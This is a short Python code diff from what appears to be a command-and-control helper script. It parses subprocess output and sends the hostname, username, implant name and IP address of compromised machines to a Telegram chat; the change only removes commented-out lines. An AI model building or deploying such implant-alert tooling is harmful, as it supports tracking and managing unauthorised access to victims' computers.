@@ -15,9 +15,7 @@ while True:
     line = str(f.stdout.readline())
     result = line.split("\\")
     try:
-      #pcname = result[26]
       report = "PC NAME: "+result[26].replace('"','')+"\nUSERNAME "+result[50].replace('"','')+"\nIMPLANT: "+result[18].replace('"','')+"\nIPADD:PORT "+result[98].replace('"','')
-      #print(report)
       telegram_send.send(messages=[report])
     except:
       None
